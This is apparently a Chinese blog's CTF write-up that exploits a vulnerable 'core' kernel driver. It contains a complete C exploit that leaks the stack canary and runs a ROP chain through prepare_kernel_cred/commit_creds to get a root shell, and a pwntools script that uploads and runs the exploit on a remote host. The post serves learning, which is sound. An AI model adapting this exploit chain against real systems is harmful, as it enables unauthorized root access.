<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 64M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./root.cpio \ <span class="comment">#用新的root.cpio启动</span></span><br><span class="line">-append <span class="string">"root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr"</span> \ <span class="comment">#nokslr</span></span><br><span class="line">-s  \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic  \</span><br><span class="line">-gdb tcp::1234 <span class="comment"># gdb 调试端口</span></span><br></pre></td></tr></table></figure>

<h3 id="启动踩坑"><a href="#启动踩坑" class="headerlink" title="启动踩坑"></a>启动踩坑</h3><p>然后启动….</p>
<p>但是启动的时候我疯狂踩坑，被坑了很久很久</p>
<p>那个-s就是代表了<code>-gdb tcp::1234</code>所以并不需要这一行….</p>
<p>然后qemu第一个报错是：<code>Initramfs unpacking failed: incorrect cpio method used: use -H newc option</code>，因为我在之前尝试用</p>
<p><code>cpio -idmv &lt; core.cpio</code>解包的时候就发现有点问题，所以我就用图形化界面的解包工具把cpio解包了之后再用<code>find . | cpio -o --format=newc &gt; ./root.cpio</code>，把它重新打包了一下</p>
<p>接着发现还是起不起来，找了师<a href="http://eternalsakura13.com/2018/03/31/b_core/" target="_blank" rel="noopener">傅们的博客</a>，就又把上面<code>.sh</code>中的 -m 64改成了 -m 128</p>
<p>还是起不来（跪，报错：Kernel panic - not syncing: Out of memory and no killable processes…</p>
<p>本来以为是自己虚拟机的问题，先跑过去激活了之前忘记激活的swap分区…然后各种操作，最后….</p>
<p>找了半天原因，…..发现原来是师傅们的128也不行，改成 -m 256M跑起来了，也差不多懂了 qemu 的-m到底是干嘛的……</p>
<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>啊….总算可以开始正式写题了</p>
<p>这里记一下一般kernel pwn的步骤吧，就照着师傅们写的来</p>
<h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p><strong>先看init函数和fop结构体</strong></p>
<p><img src="/2020/03/23/kernel%E5%85%A5%E9%97%A8/1584974897309.png" alt="1584974897309"></p>
<p>可见驱动文件创建于proc下的core文件，在我们的用户程序中对ioctl等驱动函数的访问就是通过core文件来进行的</p>
<p><img src="/2020/03/23/kernel%E5%85%A5%E9%97%A8/1584974842581.png" alt="1584974842581"></p>
<p>可以看到fop回调中只实现了如图三个回调，因此，虽然ida左侧的函数列表中还有core_read、core_copy_func但是这俩是驱动内部的函数，是不能由用户程序来调用的</p>
<h3 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h3><p><img src="/2020/03/23/kernel%E5%85%A5%E9%97%A8/1584974968510.png" alt="1584974968510"></p>
<p>根据请求码执行相应的函数</p>
<h3 id="core-read"><a href="#core-read" class="headerlink" title="core_read"></a>core_read</h3><p><img src="/2020/03/23/kernel%E5%85%A5%E9%97%A8/1584975417499.png" alt="1584975417499"></p>
<p>这里的意思大概就是打印了off还有ioctl第三个参数的值</p>
<p>然后进行了一个类似memset的操作，接着从栈buffer的off偏移位置开始拷贝给用户64字节的数据</p>
<p>显然off如果可控的话就leak了canary或者其他一些东西</p>
<p>然而off在我们传入的控制码为<code>0x6677889C</code>时，就可以直接赋值为ioctl的第三个参数</p>
<h3 id="core-copy-func"><a href="#core-copy-func" class="headerlink" title="core_copy_func"></a>core_copy_func</h3><p><img src="/2020/03/23/kernel%E5%85%A5%E9%97%A8/1584975853772.png" alt="1584975853772"></p>
<p>这个函数的意思就是ioctl的第三个参数如果大于0x3F时，就会detect到溢出然后直接返回，否则直接从name全局变量中拷入p3个字节的数据到v3这个栈buffer中，但是在memcpy时p3被转换成了unsigned __int16，所以我们在p3为负数时可以实现一个比较大的overflow</p>
<h3 id="core-write"><a href="#core-write" class="headerlink" title="core_write"></a>core_write</h3><p>再来看注册过的write函数</p>
<p><img src="/2020/03/23/kernel%E5%85%A5%E9%97%A8/1584976661640.png" alt="1584976661640"></p>
<p>user的buffer就是通过这个函数传给name，不过这里看不到v5的赋值</p>
<p><img src="/2020/03/23/kernel%E5%85%A5%E9%97%A8/1584976821281.png" alt="1584976821281"></p>
<p>在汇编里面可以看到这个赋值是通过rsi来进行的</p>
<p>所以流程就是这样：</p>
<ol>
<li>设置off值 </li>
<li>泄露canary</li>
<li>把rop链写进name变量</li>
<li>利用无符号整型漏洞进行栈溢出写rop链</li>
</ol>
<h3 id="ret2user-amp-exp"><a href="#ret2user-amp-exp" class="headerlink" title="ret2user&amp;exp"></a>ret2user&amp;exp</h3><p><img src="/2020/03/23/kernel%E5%85%A5%E9%97%A8/1584977702149.png" alt="1584977702149"></p>
<p>注意init脚本中拷贝了一份内核函数表到<code>/tmp/kallsyms</code>,可以供我们直接读到内核函数地址，此时读到的符号在开启kaslr下就是读到的kaslr后的地址，可以减去没有开kaslr时的偏移</p>
<p>对于kernel pwn的exp的话先看别人是怎么写的吧，然后自己再慢慢学着写，模板肯定都是差不多的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span>;<span class="comment">//保存用户状态时寄存器</span></span><br><span class="line"><span class="keyword">size_t</span> find_symbols();<span class="comment">//查看/tmp/kallsyms找到kaslr下函数的地址</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getpwn</span><span class="params">()</span></span>;<span class="comment">//跑/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_copy_func</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> <span class="built_in">size</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_read</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">char</span>* buf)</span></span>;<span class="comment">//这两个就是通过ioctl的操作码来和驱动设备交互了</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">   save_status();</span><br><span class="line">   <span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/proc/core"</span>, <span class="number">2</span>);</span><br><span class="line">   <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[*] open /proc/core error"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   find_symbols();</span><br><span class="line">   <span class="keyword">size_t</span> offset=vmlinux_base-raw_vmlinux_base;<span class="comment">//raw_vmlinux_base是我们没有开启kaslr时的内核加载基址，这里就是算出aslr的offset</span></span><br><span class="line">   setoff(fd,<span class="number">0x40</span>);<span class="comment">//将off的值 设置成canary对应的偏移</span></span><br><span class="line">   <span class="keyword">char</span> buf[<span class="number">0x40</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">   core_read(fd,buf);<span class="comment">//把canary读到这个buf数组里面去</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">size_t</span> canary=((<span class="keyword">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[*] canary :%p\n"</span>, canary);</span><br><span class="line">   <span class="keyword">size_t</span> rop[<span class="number">0x1000</span>];</span><br><span class="line">   <span class="keyword">int</span> i;</span><br><span class="line">   <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">   &#123;</span><br><span class="line">    rop[i]=canary;</span><br><span class="line">   &#125;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret   </span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret   rdx=&amp;'pop rcx; ret'</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; prepare_kernel_cred(0)返回值放到rdi</span></span><br><span class="line">                                            <span class="comment">//call rdx:pop rcx 把call保存的rip放到rcx去，这一步没什么意义只是为了直接ret到下一条</span></span><br><span class="line">    rop[i++] = commit_creds;<span class="comment">//执行commit_creds(rdi)</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret </span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;<span class="comment">//为了gadget中的popfq</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; 此时之前保存的用户态数据就有作用了</span></span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span> )getpwn;</span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line">    <span class="built_in">write</span>(fd,rop,<span class="number">0x800</span>);<span class="comment">//先用write写到name中，因为此设备的write是注册过的，所以可以直接用write写进去</span></span><br><span class="line">    core_copy_func(fd,<span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));<span class="comment">//然后开始core_copy实现栈溢出</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_copy_func</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[*] going core_copy_func"</span>);</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889A</span>,<span class="built_in">size</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getpwn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">   <span class="keyword">if</span>(!getuid())</span><br><span class="line">   &#123;</span><br><span class="line">      system(<span class="string">"/bin/sh"</span>);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">     <span class="built_in">puts</span>(<span class="string">"[*] get shell error"</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">core_read</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">char</span>* buf)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">     <span class="built_in">puts</span>(<span class="string">"[*] going core_read"</span>);</span><br><span class="line">     ioctl(fd,<span class="number">0x6677889B</span>,buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setoff</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">int</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"[*] going setoff"</span>);</span><br><span class="line">      ioctl(fd,<span class="number">0x6677889C</span>,<span class="built_in">size</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">"mov user_cs, cs;"</span></span><br><span class="line">            <span class="string">"mov user_ss, ss;"</span></span><br><span class="line">            <span class="string">"mov user_sp, rsp;"</span></span><br><span class="line">            <span class="string">"pushf;"</span></span><br><span class="line">            <span class="string">"pop user_rflags;"</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[*]status has been saved."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> find_symbols()</span><br><span class="line">&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">"/tmp/kallsyms"</span>, <span class="string">"r"</span>);</span><br><span class="line">    <span class="comment">/* FILE* kallsyms_fd = fopen("./test_kallsyms", "r"); */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*]open kallsyms error!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">"commit_creds"</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">"%llx"</span>, &amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"commit_creds addr: %p\n"</span>, commit_creds);</span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"vmlinux_base addr: %p\n"</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">"prepare_kernel_cred"</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">"%llx"</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"prepare_kernel_cred addr: %p\n"</span>, prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">            <span class="comment">/* printf("vmlinux_base addr: %p\n", vmlinux_base); */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*]Error!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h2><p>现在有了exp还有思路当然要自己调试的看一看了，具体调试我使用的是pwndgb</p>
<p>先把编译好的exp打包进root.cpio中（解包打包操作前面有了）(编译命令是师傅教我的<code>musl-gcc  -static -O2 exp.c -o exp</code>)</p>
<p>然后用./rootstart把qemu起起来，执行 <code>gdb vmlinux</code></p>
<p>接着<code>set architecture i386:x86-64</code>，<code>target remote:1234</code></p>
<p>这里我调试的时候第一次断在了<code>0xffffffffc00000cc</code>，地址是通过root模式下lsmod显示的驱动base加上IDA中偏移后得来的，所以感觉nokaslr下调试会方便一些（有kaslr时感觉断点都不太好下），断的地方就是在<code>core_read</code>中copy_to_user处</p>
<p><img src="/2020/03/23/kernel%E5%85%A5%E9%97%A8/1585008529686.png" alt="1585008529686"></p>
<p>断下来了之后是这样的</p>
<p>栈上的情况大致如下：</p>
<p><img src="/2020/03/23/kernel%E5%85%A5%E9%97%A8/1585008988570.png" alt="1585008988570"></p>
<p>这里分别是canary、ebp（这个ebp似乎直接返回到用户栈去了）、返回地址（对应我们驱动中ioctl的地址）</p>
<p>copy_to_user之后就可以获得8*8个栈上的数据，当然就包括canary还有一些地址了</p>
<p><img src="/2020/03/23/kernel%E5%85%A5%E9%97%A8/1585009204137.png" alt="1585009204137"></p>
<p>然后从内核态返回用户态似乎是从<code>__do_softirq+328</code>这里返回的</p>
<p><img src="/2020/03/23/kernel%E5%85%A5%E9%97%A8/1585009743004.png" alt="1585009743004"></p>
<p>最后断在qmemcpy之后（中间的感觉不用断了…挺好理解的），可以看到栈上的数据已经被改成了各种gadget还有返回时需要的寄存器值</p>
<p>调试的时候<code>log_buf_vmcoreinfo_setup+209</code>好像就是执行<code>prepare_kernel_cred(0)</code></p>
<p><code>msg_print_ext_body+227</code>就是执行<code>commit_creds(rdi)</code></p>
<p><img src="/2020/03/23/kernel%E5%85%A5%E9%97%A8/1585010675845.png" alt="1585010675845"></p>
<p>最后执行到最后ret之前就是这样了，返回用户态执行<code>/bin/sh</code>（那个0x400430就是我们的getpwn），就是从ring0直接调用，所以弹给我们的就是root的shell了</p>
<p>至于这个程序的kaslr没有特意去绕是因为我们直接读取了<code>/tmp/kallsyms</code>，从而减去没有kaslr时的内核函数基地址就可以得到加载偏移，不过内核函数加载地址和我们驱动加载地址似乎是被kaslr映射在不同的地方的，需要的情况下得分别leak才行（比如我们上面read时leak了很多内容）</p>
<p>我们这个程序也刚好没有使用到驱动的gadget，所以只用leak内核函数基址就好了</p>
<p><code>./start</code>脚本去实测的效果就是这样：</p>
<p><img src="/2020/03/23/kernel%E5%85%A5%E9%97%A8/1585011340948.png" alt="1585011340948"></p>
<p>ps：这个kaslr似乎后很多位的off都是相同的</p>
<p>这里再给出一个CTF比赛时打远程的脚本（来自林国鹏师傅）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># vim:fenc=utf-8</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Copyright © 2019 saltedfish &lt;17302010022@fudan.edu.cn&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Distributed under terms of the MIT license.</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">cmd = <span class="string">'$ '</span></span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">'192.168.3.255'</span>,<span class="number">1234</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(r)</span>:</span></span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'stty -echo'</span>)</span><br><span class="line">    os.system(<span class="string">'musl-gcc  -static -O2 exp.c -o exp'</span>)</span><br><span class="line">    os.system(<span class="string">'gzip -c exp &gt; exp.gz'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'cat &lt;&lt;EOF &gt; exp.gz.b64'</span>) <span class="comment">#heredoc</span></span><br><span class="line">    r.sendline((read(<span class="string">'exp.gz'</span>)).encode(<span class="string">'base64'</span>))</span><br><span class="line">    r.sendline(<span class="string">'EOF'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'base64 -d exp.gz.b64 &gt; exp.gz'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'gunzip exp.gz'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'chmod +x ./exp'</span>)</span><br><span class="line">    r.sendlineafter(cmd, <span class="string">'./exp'</span>)</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line">exploit(r)</span><br></pre></td></tr></table></figure>






    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/kernel/" rel="tag"># kernel</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2020/03/15/how2heap-house-of-orange-houseoforange/" rel="prev" title="how2heap - house_of_orange&houseoforange">
      <i class="fa fa-chevron-left"></i> how2heap - house_of_orange&houseoforange
    </a></div>
      <div class="post-nav-item">
    <a href="/2020/04/01/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AF%AF%E5%88%A0apt%E5%8C%85%E5%90%8E%E7%9A%84%E9%87%8D%E6%96%B0%E6%81%A2%E5%A4%8D/" rel="next" title="记录一次虚拟机误删apt包后的重新恢复">
      记录一次虚拟机误删apt包后的重新恢复 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  

  </div>


          </div>
          
    <div class="comments" id="valine-comments"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let activeClass = CONFIG.comments.activeClass;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#kernel入门"><span class="nav-number">1.</span> <span class="nav-text">kernel入门</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#编译驱动程序"><span class="nav-number">1.1.</span> <span class="nav-text">编译驱动程序</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#hello-c"><span class="nav-number">1.1.1.</span> <span class="nav-text">hello.c</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#IDA界面如下"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">IDA界面如下</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#在dev下增加驱动文件"><span class="nav-number">1.2.</span> <span class="nav-text">在dev下增加驱动文件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#IDA界面如下-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">IDA界面如下</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#kernel-pwn基础知识"><span class="nav-number">2.</span> <span class="nav-text">kernel pwn基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#进入kernel态进行的操作"><span class="nav-number">2.1.</span> <span class="nav-text">进入kernel态进行的操作</span></a></li><li 